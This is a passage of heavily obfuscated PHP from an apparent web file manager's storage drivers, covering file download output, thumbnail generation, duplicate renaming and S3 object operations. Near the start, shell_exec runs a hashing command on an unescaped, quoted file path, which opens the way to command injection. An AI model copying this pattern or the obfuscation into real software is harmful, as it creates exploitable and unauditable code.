($•Ê‰¦ÑÖ as $ÓèÃ»ìÚ) { $Æñ‰ÀÌ‘ = shell_exec($ÓèÃ»ìÚ . "\x20\x22{$Í¥Â¢¬€}\42"); if ($Æñ‰ÀÌ‘ && substr(trim($Æñ‰ÀÌ‘), 0, 32) == $Şí›®‘) { $Ñ“¹ÄæÅ = $ÓèÃ»ìÚ; break; } } Cache::set($¬×÷Û–‰[103], $Ñ“¹ÄæÅ, 3600); } if ($Ñ“¹ÄæÅ == $¬×÷Û–‰[105]) { return !1; } $Æñ‰ÀÌ‘ = shell_exec($Ñ“¹ÄæÅ . "\x20\x22{$£Ü«–Šğ}\x22"); $Æñ‰ÀÌ‘ = str_replace($¬×÷Û–‰[106], $¬×÷Û–‰[12], $Æñ‰ÀÌ‘); return substr($Æñ‰ÀÌ‘, 0, 32); } public function link($™°Ä¤‰­) { return $™°Ä¤‰­; } public function fileOut($ûÆ¢™Éì, $â½«¡îš = false, $¼•ÛÂ„– = false, $›åäÚõ = '') { $Ÿ¿áÛ¨ =& $_SERVER[èùÙ¹Ïö]; $this->cacheMethod(null, null); if (!$ûÆ¢™Éì || !$this->exist($ûÆ¢™Éì)) { show_json(LNG($Ÿ¿áÛ¨[107]), !1, $¼•ÛÂ„–); } $ÔĞÓİôŸ = $this->getType() == $Ÿ¿áÛ¨[108]; $Ëµş½¬ã = $GLOBALS[$Ÿ¿áÛ¨[6]][$Ÿ¿áÛ¨[91]][$Ÿ¿áÛ¨[109]][$Ÿ¿áÛ¨[110]]; $Ô—Ëı‡ = (double) $GLOBALS[$Ÿ¿áÛ¨[6]][$Ÿ¿áÛ¨[91]][$Ÿ¿áÛ¨[109]][$Ÿ¿áÛ¨[111]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $óûÀûàß = $this->infoFull($ûÆ¢™Éì); $Åü’öü½ = $óûÀûàß[$Ÿ¿áÛ¨[78]]; $„ÖÚìú• = gmdate($Ÿ¿áÛ¨[112], $óûÀûàß[$Ÿ¿áÛ¨[87]]); $ÈøƒÑ…Ü = $¼•ÛÂ„– ? $¼•ÛÂ„– : $this->iconvApp($óûÀûàß[$Ÿ¿áÛ¨[32]]); $·Şë†¨ = 0; $¸Îôöé = $Åü’öü½ - 1; $Æ“Ó•µÛ = $this->ext($ÈøƒÑ…Ü); if (in_array($Æ“Ó•µÛ, array($Ÿ¿áÛ¨[113], $Ÿ¿áÛ¨[114], $Ÿ¿áÛ¨[115], $Ÿ¿áÛ¨[116]))) { $Æ“Ó•µÛ = $Ÿ¿áÛ¨[117]; } if (in_array($Æ“Ó•µÛ, array($Ÿ¿áÛ¨[118]))) { $Æ“Ó•µÛ = $Ÿ¿áÛ¨[119]; } if (!$›åäÚõ) { $›åäÚõ = md5($„ÖÚìú• . $Åü’öü½); } $›åäÚõ = $Ÿ¿áÛ¨[120] . $›åäÚõ . $Ÿ¿áÛ¨[120]; $£ëŸêß¤ = get_file_mime($Æ“Ó•µÛ); $‰â†±çî = !0; $‰â†±çî = isset($_GET[$Ÿ¿áÛ¨[121]]) ? !1 : !0; if ($â½«¡îš === !1 && !mime_support($£ëŸêß¤)) { $£ëŸêß¤ = $Ÿ¿áÛ¨[122]; } header($Ÿ¿áÛ¨[123]); header($Ÿ¿áÛ¨[124] . $£ëŸêß¤); $‘¿Ûí¥ = rawurlencode($ÈøƒÑ…Ü); $‘¿Ûí¥ = $Ÿ¿áÛ¨[120] . $‘¿Ûí¥ . $Ÿ¿áÛ¨[125] . $‘¿Ûí¥; if ($â½«¡îš) { header($Ÿ¿áÛ¨[126]); header($Ÿ¿áÛ¨[127] . $‘¿Ûí¥); } else { if ($‰â†±çî) { header($Ÿ¿áÛ¨[128] . $‘¿Ûí¥); } } header($Ÿ¿áÛ¨[129] . gmdate($Ÿ¿áÛ¨[112], time() + 3600 * 24 * 30) . $Ÿ¿áÛ¨[130]); header($Ÿ¿áÛ¨[131]); header($Ÿ¿áÛ¨[132]); header($Ÿ¿áÛ¨[133]); if (isset($_SERVER[$Ÿ¿áÛ¨[134]]) && strtotime($_SERVER[$Ÿ¿áÛ¨[134]]) == $óûÀûàß[$Ÿ¿áÛ¨[87]]) { header($Ÿ¿áÛ¨[135], !0, 304); die; } if (isset($_SERVER[$Ÿ¿áÛ¨[136]]) && $_SERVER[$Ÿ¿áÛ¨[136]] == $›åäÚõ) { header($Ÿ¿áÛ¨[137] . $›åäÚõ, !0, 304); die; } header($Ÿ¿áÛ¨[137] . $›åäÚõ); header($Ÿ¿áÛ¨[138] . $„ÖÚìú• . $Ÿ¿áÛ¨[130]); header($Ÿ¿áÛ¨[139] . $ÈøƒÑ…Ü); header($Ÿ¿áÛ¨[140]); header($Ÿ¿áÛ¨[141] . $Åü’öü½); header($Ÿ¿áÛ¨[142]); Hook::trigger($Ÿ¿áÛ¨[143], $ûÆ¢™Éì, $Åü’öü½, $ÈøƒÑ…Ü, $Æ“Ó•µÛ); if (!$â½«¡îš && $Æ“Ó•µÛ == $Ÿ¿áÛ¨[144]) { if ($Åü’öü½ > 1024 * 1024 * 5) { die; } $Æ´ª´Ø¯ = $this->getContent($ûÆ¢™Éì); $Æ´ª´Ø¯ = Html::clearSVG($Æ´ª´Ø¯); header($Ÿ¿áÛ¨[145] . strlen($Æ´ª´Ø¯)); echo $Æ´ª´Ø¯; die; } $”Ä½Éè = strtolower($_SERVER[$Ÿ¿áÛ¨[146]]); if ($ÔĞÓİôŸ && $”Ä½Éè && $Ëµş½¬ã) { if (strstr($”Ä½Éè, $Ÿ¿áÛ¨[147])) { header($Ÿ¿áÛ¨[148] . $ûÆ¢™Éì); } else { if (strstr($”Ä½Éè, $Ÿ¿áÛ¨[149])) { header($Ÿ¿áÛ¨[150] . $ûÆ¢™Éì); } else { if (strstr($”Ä½Éè, $Ÿ¿áÛ¨[151])) { header($Ÿ¿áÛ¨[152] . $ûÆ¢™Éì); } } } if ($Ô—Ëı‡) { header($Ÿ¿áÛ¨[153] . $Ô—Ëı‡); } return; } if (isset($_SERVER[$Ÿ¿áÛ¨[154]])) { if (preg_match($Ÿ¿áÛ¨[155], $_SERVER[$Ÿ¿áÛ¨[154]], $¢’£½ÉÒ)) { $·Şë†¨ = intval($¢’£½ÉÒ[1]); $·Şë†¨ = $·Şë†¨ <= 0 ? 0 : ($·Şë†¨ >= $¸Îôöé ? $¸Îôöé : $·Şë†¨); if (!empty($¢’£½ÉÒ[2])) { $óÁÉš… = intval($¢’£½ÉÒ[2]); $¸Îôöé = $óÁÉš… < $·Şë†¨ ? $·Şë†¨ : ($óÁÉš… >= $¸Îôöé ? $¸Îôöé : $óÁÉš…); } } header($Ÿ¿áÛ¨[156]); header("\103\x6f\x6e\164\x65\156\164\x2d\122\141\x6e\147\145\72\40\142\x79\164\x65\163\40{$·Şë†¨}\55{$¸Îôöé}\x2f" . $Åü’öü½); } else { header($Ÿ¿áÛ¨[157]); } header($Ÿ¿áÛ¨[158]); $ı¿éÁòŞ = !0; if ($_SERVER[$Ÿ¿áÛ¨[159]] == $Ÿ¿áÛ¨[160] && $Åü’öü½ > 1204 * 1024 * 1024 * 2) { $ı¿éÁòŞ = !1; } if ($ı¿éÁòŞ) { header($Ÿ¿áÛ¨[161] . ($¸Îôöé - $·Şë†¨ + 1)); } if ($_SERVER[$Ÿ¿áÛ¨[162]] == $Ÿ¿áÛ¨[163]) { return; } $Îåï„’ = 1024 * 100; $ô…Ğ°Ñı = 0; if ($Ô—Ëı‡) { $ô…Ğ°Ñı = intval(1000 * 1000 * ($Îåï„’ / $Ô—Ëı‡)); } while ($·Şë†¨ <= $¸Îôöé) { $¿¡”Ç±ò = timeFloat(); check_abort(); $áÚßÆŸæ = $¸Îôöé - $·Şë†¨ + 1; if ($áÚßÆŸæ <= $Îåï„’) { $Îåï„’ = $áÚßÆŸæ; } echo $this->fileSubstr($ûÆ¢™Éì, $·Şë†¨, $Îåï„’); $·Şë†¨ += $Îåï„’; if ($Îåï„’ == $áÚßÆŸæ) { $·Şë†¨ = $¸Îôöé + 1; } if ($ô…Ğ°Ñı) { $Ë–ßçÚé = intval(1000 * 1000 * (timeFloat() - $¿¡”Ç±ò)); $‹İ­©ß™ = $ô…Ğ°Ñı - $Ë–ßçÚé; if ($‹İ­©ß™ > 5) { usleep($‹İ­©ß™); } } } } public function fileOutServer($ã¯­ ÉÜ, $Ú«Ä¾Ùş = false, $¨Ôò©¯ = false, $ì£Êı«ñ = '') { $this->fileOut($ã¯­ ÉÜ, $Ú«Ä¾Ùş, $¨Ôò©¯, $ì£Êı«ñ); } public function fileOutLink($ÅŞ¨¥´Ä) { header($_SERVER[èùÙ¹Ïö][164] . $ÅŞ¨¥´Ä); die; } public function cacheMethod($ÛÇ¥ÙÓ, $·©„‘ã¡, $“Âøç«” = null) { $à§¡¥İ =& $_SERVER[èùÙ¹Ïö]; static $™¥åÖ¸Ä = array(); $íÜµ±‘´ = $·©„‘ã¡ ? ltrim($this->getPathOuter($·©„‘ã¡), $à§¡¥İ[8]) : $à§¡¥İ[12]; $İ†ŞñÏ© = $à§¡¥İ[165] . $ÛÇ¥ÙÓ . $à§¡¥İ[166] . rtrim($íÜµ±‘´, $à§¡¥İ[8]); if (is_null($ÛÇ¥ÙÓ)) { $™¥åÖ¸Ä = array(); return; } if (is_null($·©„‘ã¡)) { foreach ($™¥åÖ¸Ä as $İ†ŞñÏ© => $£è§®‰) { if (!strstr($İ†ŞñÏ©, $à§¡¥İ[165] . $ÛÇ¥ÙÓ . $à§¡¥İ[167])) { continue; } unset($™¥åÖ¸Ä[$İ†ŞñÏ©]); } return; } if (!is_null($“Âøç«”)) { $™¥åÖ¸Ä[$İ†ŞñÏ©] = $“Âøç«”; return; } $á¯õš·ã = isset($™¥åÖ¸Ä[$İ†ŞñÏ©]) ? $™¥åÖ¸Ä[$İ†ŞñÏ©] : null; if (!is_null($á¯õš·ã)) { return $á¯õš·ã; } $á¯õš·ã = $this->{$ÛÇ¥ÙÓ}($·©„‘ã¡); $™¥åÖ¸Ä[$İ†ŞñÏ©] = $á¯õš·ã; return $á¯õš·ã; } public function cacheMethodInfoSet($¾î„ìö, $’µü£êì, $ûèü›Œú = false) { $¨àÉ¤ò™ =& $_SERVER[èùÙ¹Ïö]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($¨àÉ¤ò™[168], $¾î„ìö, $’µü£êì); $this->cacheMethod($¨àÉ¤ò™[169], $¾î„ìö, $’µü£êì ? !1 : !0); if (is_array($ûèü›Œú)) { $this->cacheMethod($¨àÉ¤ò™[170], $¾î„ìö, $ûèü›Œú); } } public function fileOutImage($‹şüØçÉ, $è£Ô’ÃŞ = 250) { $ı³ïö×¯ =& $_SERVER[èùÙ¹Ïö]; set_timeout(); if (substr($‹şüØçÉ, 0, 4) == $ı³ïö×¯[151]) { $this->fileOutLink($‹şüØçÉ); } $Ü¿ÓÁí = $this->info($‹şüØçÉ); $§Ù¯ÉÒ = !1; $íü¤æ¯‘ = isset($GLOBALS[$ı³ïö×¯[171]]) ? $GLOBALS[$ı³ïö×¯[171]] : array(); if ($íü¤æ¯‘ && $íü¤æ¯‘[$ı³ïö×¯[172]] == $Ü¿ÓÁí[$ı³ïö×¯[86]]) { $Ü¿ÓÁí = $íü¤æ¯‘; $·Ûü¬êİ = $Ü¿ÓÁí[$ı³ïö×¯[173]]; if ($·Ûü¬êİ && isset($·Ûü¬êİ[$ı³ïö×¯[174]])) { if ($·Ûü¬êİ[$ı³ïö×¯[174]] <= $è£Ô’ÃŞ && $·Ûü¬êİ[$ı³ïö×¯[175]] <= $è£Ô’ÃŞ) { $§Ù¯ÉÒ = !0; } } } if ($Ü¿ÓÁí[$ı³ïö×¯[78]] <= 1024 * 50 || $§Ù¯ÉÒ || !function_exists($ı³ïö×¯[176]) || $Ü¿ÓÁí[$ı³ïö×¯[177]] == $ı³ïö×¯[178]) { return $this->fileOut($‹şüØçÉ, !1, $Ü¿ÓÁí[$ı³ïö×¯[32]]); } $Í‡‡‘´ë = kodIO::hashPath($Ü¿ÓÁí); $œ®²¥Êƒ = "\x63\x6f\x76\x65\162\137{$Í‡‡‘´ë}\137{$è£Ô’ÃŞ}\x2e\x70\156\x67"; $éÃ¦Ó¹Ê = IO_PATH_SYSTEM_TEMP . $ı³ïö×¯[179]; $ß»èò”À = IO::infoFullSimple($éÃ¦Ó¹Ê); $“—ÑÖ‰£ = $ß»èò”À && is_array($ß»èò”À) ? $ß»èò”À[$ı³ïö×¯[86]] : $ı³ïö×¯[12]; if (!$“—ÑÖ‰£) { $“—ÑÖ‰£ = IO::mkdir($éÃ¦Ó¹Ê); } if ($Ü¿ÓÁí[$ı³ïö×¯[180]] == $ı³ïö×¯[181] && isset($Ü¿ÓÁí[$ı³ïö×¯[182]]) && $Ü¿ÓÁí[$ı³ïö×¯[182]] == kodIO::sourceID($“—ÑÖ‰£)) { $ô“èÖ¤Ş = $Ü¿ÓÁí[$ı³ïö×¯[183]]; if ($è£Ô’ÃŞ <= 500) { $ç‹Ã²é = preg_replace($ı³ïö×¯[184], $ı³ïö×¯[185], $Ü¿ÓÁí[$ı³ïö×¯[32]]); $ô“èÖ¤Ş = IO::fileNameExist($“—ÑÖ‰£, $ç‹Ã²é); } return IO::fileOut(KodIO::make($ô“èÖ¤Ş), !1, $Ü¿ÓÁí[$ı³ïö×¯[32]]); } $€Àå›šÄ = IO::fileNameExist($“—ÑÖ‰£, $œ®²¥Êƒ); if ($€Àå›šÄ) { return IO::fileOut(KodIO::make($€Àå›šÄ), !1, $Ü¿ÓÁí[$ı³ïö×¯[32]]); } if ($è£Ô’ÃŞ > 1000) { $this->makeImageCover($“—ÑÖ‰£, $‹şüØçÉ, $œ®²¥Êƒ, $è£Ô’ÃŞ); $this->makeImageCover($“—ÑÖ‰£, $‹şüØçÉ, "\x63\157\x76\x65\x72\137{$Í‡‡‘´ë}\137\62\65\x30\56\x70\x6e\147", 250); $€Àå›šÄ = IO::fileNameExist($“—ÑÖ‰£, $œ®²¥Êƒ); if ($€Àå›šÄ) { return IO::fileOut(KodIO::make($€Àå›šÄ), !1, $Ü¿ÓÁí[$ı³ïö×¯[32]]); } die; } $˜òÖı— = Cache::get($œ®²¥Êƒ); if ($˜òÖı— == $ı³ïö×¯[186] || $˜òÖı— == $ı³ïö×¯[187]) { echo $˜òÖı—; die; } Cache::set($œ®²¥Êƒ, $ı³ïö×¯[187], 60); $ğÁá¢„Ú = array($“—ÑÖ‰£, $Ü¿ÓÁí[$ı³ïö×¯[86]], $œ®²¥Êƒ, $è£Ô’ÃŞ); $ì›´Şä = $ı³ïö×¯[188] . $Ü¿ÓÁí[$ı³ïö×¯[78]] . $ı³ïö×¯[189] . $œ®²¥Êƒ . $ı³ïö×¯[190] . $Ü¿ÓÁí[$ı³ïö×¯[32]] . $ı³ïö×¯[191] . $Ü¿ÓÁí[$ı³ïö×¯[86]]; TaskQueue::add($ı³ïö×¯[192], $ğÁá¢„Ú, $ì›´Şä, $œ®²¥Êƒ); } public function makeImageCover($§ø£àË†, $§ş·³Ò¾, $¡ıÆŒ›¶, $øóó¨ºÕ) { $Œ¢®Î‡ù =& $_SERVER[èùÙ¹Ïö]; if (IO::fileNameExist($§ø£àË†, $¡ıÆŒ›¶)) { return $Œ¢®Î‡ù[193]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $½•îßğ¶ = DATA_THUMB . $¡ıÆŒ›¶; del_file($½•îßğ¶); $·ººğ™¨ = TEMP_FILES . $¡ıÆŒ›¶; if (!@file_exists($·ººğ™¨)) { $·ººğ™¨ = $this->download($§ş·³Ò¾, $·ººğ™¨); } if (!@file_exists($·ººğ™¨)) { return $Œ¢®Î‡ù[194]; } ImageThumb::createThumb($·ººğ™¨, $½•îßğ¶, $øóó¨ºÕ, $øóó¨ºÕ * 10); if (@file_exists($½•îßğ¶)) { Cache::remove($¡ıÆŒ›¶); return IO::move($½•îßğ¶, $§ø£àË†); } Cache::set($¡ıÆŒ›¶, $Œ¢®Î‡ù[186], 600); del_file($½•îßğ¶); return $Œ¢®Î‡ù[195] . $·ººğ™¨ . $Œ¢®Î‡ù[73]; } public function fileOutImageServer($¿£¬Çİ, $¡úøãÂî = 250) { $this->fileOutImage($¿£¬Çİ, $¡úøãÂî); } public function fileNameAuto($àã´ößü, $Ê•Ê¼Ğ“, $ÊµÂ„ù§ = REPEAT_RENAME, $ç¹‚´Çñ = false) { $ûè†•ëá =& $_SERVER[èùÙ¹Ïö]; $µÜ”ä = $àã´ößü === $ûè†•ëá[12] ? $Ê•Ê¼Ğ“ : rtrim($àã´ößü, $ûè†•ëá[8]) . $ûè†•ëá[8] . $Ê•Ê¼Ğ“; if ($ÊµÂ„ù§ == REPEAT_REPLACE || !$this->exist($µÜ”ä) || $ç¹‚´Çñ && $ÊµÂ„ù§ != REPEAT_RENAME_FOLDER) { return $Ê•Ê¼Ğ“; } if ($ÊµÂ„ù§ == REPEAT_SKIP) { return !1; } $¤ŞÒÍæÚ = $ûè†•ëá[10] . get_path_ext($Ê•Ê¼Ğ“); $¤ŞÒÍæÚ = $¤ŞÒÍæÚ == $ûè†•ëá[10] || $ç¹‚´Çñ ? $ûè†•ëá[12] : $¤ŞÒÍæÚ; $¾§¬ğÇÅ = 1; $´ôµ¬ïø = substr($Ê•Ê¼Ğ“, 0, strlen($Ê•Ê¼Ğ“) - strlen($¤ŞÒÍæÚ)); $íÈÂÅ© = $´ôµ¬ïø . "\x28{$¾§¬ğÇÅ}\x29{$¤ŞÒÍæÚ}"; while ($this->exist(rtrim($àã´ößü, $ûè†•ëá[8]) . $ûè†•ëá[8] . $íÈÂÅ©)) { $íÈÂÅ© = $´ôµ¬ïø . "\x28{$¾§¬ğÇÅ}\x29{$¤ŞÒÍæÚ}"; $¾§¬ğÇÅ++; } return $íÈÂÅ©; } private function fileNameAutoList($çÃÜŠ‚, $ôÅš×”¸, $¥ÑÓÎŞ® = false) { $÷¾¸÷‰ã =& $_SERVER[èùÙ¹Ïö]; $Ê²ëÅ–” = $this->listPath($çÃÜŠ‚, !0); $Ê²ëÅ–” = array_merge($Ê²ëÅ–”[$÷¾¸÷‰ã[84]], $Ê²ëÅ–”[$÷¾¸÷‰ã[85]]); $ğÄÈş¹ = array_to_keyvalue($Ê²ëÅ–”, $÷¾¸÷‰ã[12], $÷¾¸÷‰ã[32]); $ÊŒ³†»Ë = $÷¾¸÷‰ã[10] . get_path_ext($ôÅš×”¸); $ÊŒ³†»Ë = $ÊŒ³†»Ë == $÷¾¸÷‰ã[10] || $¥ÑÓÎŞ® ? $÷¾¸÷‰ã[12] : $ÊŒ³†»Ë; $¿Ï¢¸ñ = substr($ôÅš×”¸, 0, strlen($ôÅš×”¸) - strlen($ÊŒ³†»Ë)); $öçøèç = $¿Ï¢¸ñ . "\x28\x30\x29{$ÊŒ³†»Ë}"; for ($æû‹ïÃÆ = 1; $æû‹ïÃÆ <= count($ğÄÈş¹) + 1; $æû‹ïÃÆ++) { $öçøèç = $¿Ï¢¸ñ . "\50{$æû‹ïÃÆ}\51{$ÊŒ³†»Ë}"; if (!in_array_not_case($öçøèç, $ğÄÈş¹)) { return $öçøèç; } } return $öçøèç; } public function listAllFiles($ıÇ‚ä«ë, $Á„åüáº) { $Çúß¦ =& $_SERVER[èùÙ¹Ïö]; if (empty($Á„åüáº)) { return array(); } $ÅüÓ¯•ò = array_keys($Á„åüáº); $äĞ‰Í²ø = array(); $ıÇ‚ä«ë = trim($ıÇ‚ä«ë, $Çúß¦[8]); foreach ($Á„åüáº as $çëòê¼â => $Ùµ¸ôò¤) { $Åû»ªã÷ = ltrim(substr(trim($çëòê¼â, $Çúß¦[8]), strlen($ıÇ‚ä«ë)), $Çúß¦[8]); if (substr($çëòê¼â, -1) == $Çúß¦[8]) { $Åû»ªã÷ = rtrim($Åû»ªã÷, $Çúß¦[8]) . $Çúß¦[8]; } $äĞ‰Í²ø = array_merge($äĞ‰Í²ø, $this->slicePath($Åû»ªã÷)); } $Ü˜ÒÉ = array(); foreach (array_unique($äĞ‰Í²ø) as $ß•‘å¼¥) { $óÎ‡·¿é = array($Çúß¦[86] => $this->getPathOuter($Çúß¦[8] . $ıÇ‚ä«ë . $Çúß¦[8] . $ß•‘å¼¥), $Çúß¦[77] => 1, $Çúß¦[78] => 0); if (substr($ß•‘å¼¥, -1) != $Çúß¦[8]) { $óÎ‡·¿é[$Çúß¦[77]] = 0; $¬‡€œ•¡ = $this->getPath($ıÇ‚ä«ë . $Çúß¦[8] . $ß•‘å¼¥); if (isset($Á„åüáº[$¬‡€œ•¡])) { $Åé‘Óø§ = $Á„åüáº[$¬‡€œ•¡]; if (isset($Åé‘Óø§[$Çúß¦[78]])) { $óÎ‡·¿é[$Çúß¦[78]] = intval($Åé‘Óø§[$Çúß¦[78]]); } if (isset($Åé‘Óø§[$Çúß¦[196]])) { $óÎ‡·¿é[$Çúß¦[87]] = intval($Åé‘Óø§[$Çúß¦[196]]); } } } $Ü˜ÒÉ[] = $óÎ‡·¿é; } return $Ü˜ÒÉ; } public function slicePath($ÓÂÄÊªÄ) { $ÏîÌ”×˜ =& $_SERVER[èùÙ¹Ïö]; $›Ö“ª¹ = explode($ÏîÌ”×˜[8], trim($ÓÂÄÊªÄ, $ÏîÌ”×˜[8])); $½Îà‰éõ = 0; do { ++$½Îà‰éõ; $œçËàÈ[] = implode($ÏîÌ”×˜[8], array_slice($›Ö“ª¹, 0, $½Îà‰éõ)) . $ÏîÌ”×˜[8]; } while ($½Îà‰éõ < count($›Ö“ª¹)); $œçËàÈ[count($›Ö“ª¹) - 1] = $ÓÂÄÊªÄ; return $œçËàÈ; } public function getHost() { $Ûğ™ñÌÂ =& $_SERVER[èùÙ¹Ïö]; $Â­£äØµ = parse_url(trim($this->domain, $Ûğ™ñÌÂ[8])); $Ö ªó± = isset($Â­£äØµ[$Ûğ™ñÌÂ[197]]) ? $Â­£äØµ[$Ûğ™ñÌÂ[197]] : http_type(); $“ôÒÂì• = isset($Â­£äØµ[$Ûğ™ñÌÂ[198]]) ? $Â­£äØµ[$Ûğ™ñÌÂ[198]] : $Â­£äØµ[$Ûğ™ñÌÂ[86]]; if (isset($Â­£äØµ[$Ûğ™ñÌÂ[199]])) { $“ôÒÂì• .= $Ûğ™ñÌÂ[4] . $Â­£äØµ[$Ûğ™ñÌÂ[199]]; } return $Ö ªó± . $Ûğ™ñÌÂ[200] . $“ôÒÂì•; } public function pathEncode($¤îâ×È¾) { $ ¤èÍ«… =& $_SERVER[èùÙ¹Ïö]; return str_replace($ ¤èÍ«…[201], $ ¤èÍ«…[8], rawurlencode($¤îâ×È¾)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($º»ßº¢’) { set_timeout(); require_once SDK_DIR . $_SERVER[èùÙ¹Ïö][202]; parent::__construct(); $this->_init($º»ßº¢’); } public function _init($Ôä ×ß¢) { $this->config = $Ôä ×ß¢; foreach ($Ôä ×ß¢ as $íĞ—¬ßª => $‹¦¸µôê) { if (isset($this->{$íĞ—¬ßª})) { $this->{$íĞ—¬ßª} = $‹¦¸µôê; } } $this->endpoint = $Ôä ×ß¢[$_SERVER[èùÙ¹Ïö][203]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($æ„Ñ³å = "\166\x34") { $this->signVer = $æ„Ñ³å; $this->client->setSignatureVersion($æ„Ñ³å); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $À‘“ÊÇ =& $_SERVER[èùÙ¹Ïö]; $¤°ø¼ê» = $this->getBucketCors(); if (!$¤°ø¼ê» || !is_array($¤°ø¼ê»)) { return !1; } if ($¤°ø¼ê»[$À‘“ÊÇ[204]] != $À‘“ÊÇ[205] || $¤°ø¼ê»[$À‘“ÊÇ[206]] != $À‘“ÊÇ[205]) { return !1; } $Å‰ê«®£ = array_map($À‘“ÊÇ[207], $¤°ø¼ê»[$À‘“ÊÇ[208]]); if (!is_array($Å‰ê«®£)) { $Å‰ê«®£ = array(); } $ø¦‡·ø = array($À‘“ÊÇ[209], $À‘“ÊÇ[210], $À‘“ÊÇ[211], $À‘“ÊÇ[212], $À‘“ÊÇ[213]); $‡Ì¥ÃéÃ = array_diff($ø¦‡·ø, $Å‰ê«®£); return empty($‡Ì¥ÃéÃ); } public function mkfile($¬ÌšÚÄƒ, $òƒ´ĞÅÂ = '', $‚…¯ª„ê = REPEAT_RENAME) { $ÌÉöÏ¾î = $this->setContent($¬ÌšÚÄƒ, $òƒ´ĞÅÂ); if ($ÌÉöÏ¾î !== !1) { return $this->getPathOuter($¬ÌšÚÄƒ); } return !1; } public function mkdir($”êİ·¤Å, $¬Ø¦ûÆÙ = REPEAT_SKIP) { $Ä¬Ä‡¯ =& $_SERVER[èùÙ¹Ïö]; if (empty($”êİ·¤Å) && $”êİ·¤Å !== $Ä¬Ä‡¯[214]) { return !1; } if ($¬Ø¦ûÆÙ && $this->_isFolder($”êİ·¤Å)) { return $this->getPathOuter($”êİ·¤Å); } $·Î«Í = $this->setContent($”êİ·¤Å, $Ä¬Ä‡¯[12], !0); if ($·Î«Í !== !1) { return $this->getPathOuter($”êİ·¤Å); } return !1; } public function copyFile($¡äø‚çœ, $Áß¼ÒÖÂ, $°º™äÇ = array()) { $ßè¬¸ =& $_SERVER[èùÙ¹Ïö]; $ûŒÇ•Ùª = $this->objectMeta($¡äø‚çœ); if (!$ûŒÇ•Ùª) { return !1; } if ($ûŒÇ•Ùª[$ßè¬¸[78]] <= 1024 * 1024 * 200) { $‹âñÉ¿Ñ = $this->client->copyObject($this->bucket, $¡äø‚çœ, $this->bucket, $Áß¼ÒÖÂ, $ßè¬¸[215], $°º™äÇ); } else { $‹âñÉ¿Ñ = $this->client->multiCopyObject($this->bucket, $¡äø‚çœ, $this->bucket, $Áß¼ÒÖÂ, $°º™äÇ); } $‹âñÉ¿Ñ = $‹âñÉ¿Ñ ? $this->getPathOuter($Áß¼ÒÖÂ) : !1; return $‹âñÉ¿Ñ; } public function moveFile($ÀÍ¶Ëù, $×Ššˆ°È) { if ($this->copyFile($ÀÍ¶Ëù, $×Ššˆ°È)) { $this->delFile($ÀÍ¶Ëù); return $this->getPathOuter($×Ššˆ°È); } return !1; } public function delFile($œ€èş›Ñ) { return $this->client->deleteObject($this->bucket, $œ€èş›Ñ); } public function delFolder($¢ßÒÄ¥’) { $Õ¨•Ø®Ñ =& $_SERVER[èùÙ¹Ïö]; if (!$this->exist($¢ßÒÄ¥’)) { return !0; } $this->listItemCache = !1; $ñÂƒßÏ­ = $this->fileList($¢ßÒÄ¥’); $this->listItemCache = !0; $‡øª¶ºë = trim($¢ßÒÄ¥’, $Õ¨•Ø®Ñ[8]) . $Õ¨•Ø®Ñ[8]; if (!empty($¢ßÒÄ¥’) && $¢ßÒÄ¥’ !== $Õ¨•Ø®Ñ[214] && !in_array($‡øª¶ºë, $ñÂƒßÏ­[$Õ¨•Ø®Ñ[84]])) { $ñÂƒßÏ­[$Õ¨•Ø®Ñ[84]][] = $‡øª¶ºë; } $ıİğÁíº = $this->delByBatch($ñÂƒßÏ­[$Õ¨•Ø®Ñ[85]]); if (!$ıİğÁíº) { return !1; } $ıİğÁíº = $this->delByBatch($ñÂƒßÏ­[$Õ¨•Ø®Ñ[84]]); if (!$ıİğÁíº) { return !1; } return $this->delFile($‡øª¶ºë); } private function delByBatch($‘ôÌÀƒñ) { foreach (array_chunk($‘ôÌÀƒñ, 1000) as $ÁÓÒÃ¡) { $ÖªŒÑüü = $this->client->deleteObjects($this->bucket, $ÁÓÒÃ¡); if (!$ÖªŒÑüü) { return !1; } } return !0; } public function rename($¡öçŠü“, $´—­˜Á¾) { return $this->renameObject($¡öçŠü“, $´—­˜Á¾); } public function listPath($×Ó·“¸˜, $ä²İè¨½ = false) { $¿“éæÉÕ =& $_SERVER[èùÙ¹Ïö]; $´Åü¯í÷ = $this->fileList($×Ó·“¸˜, $¿“éæÉÕ[8], !0); foreach ($´Åü¯í÷[$¿“éæÉÕ[84]] as $™ä–Õ¯Ê => $Ë€‘ÜØ„) { $´Åü¯í÷[$¿“éæÉÕ[84]][$™ä–Õ¯Ê] = $this->folderInfo($Ë€‘ÜØ„, $ä²İè¨½, $Ë€‘ÜØ„); } foreach ($´Åü¯í÷[$¿“éæÉÕ[85]] as $™ä–Õ¯Ê => $Ë€‘ÜØ„) { $´Åü¯í÷[$¿“éæÉÕ[85]][$™ä–Õ¯Ê] = $this->fileInfo($Ë€‘ÜØ„[$¿“éæÉÕ[32]], $ä²İè¨½, $Ë€‘ÜØ„); } return $´Åü¯í÷; } protected function infoChildren($†²ÖşÌ , &$Ôóë¶™Ì) { $Íù²³™İ =& $_SERVER[èùÙ¹Ïö]; $ûşı¤Ã = $this->fileList($†²ÖşÌ , $Íù²³™İ[12], !0); $Ôóë¶™Ì[$Íù²³™İ[80]] += count($ûşı¤Ã[$Íù²³™İ[84]]); $Ôóë¶™Ì[$Íù²³™İ[79]] += count($ûşı¤Ã[$Íù²³™İ[85]]); foreach ($ûşı¤Ã[$Íù²³™İ[85]] as $ŞÜÎàä) { if (!$ŞÜÎàä || !$ŞÜÎàä[$Íù²³™İ[78]]) { continue; } $Ôóë¶™Ì[$Íù²³™İ[78]] += 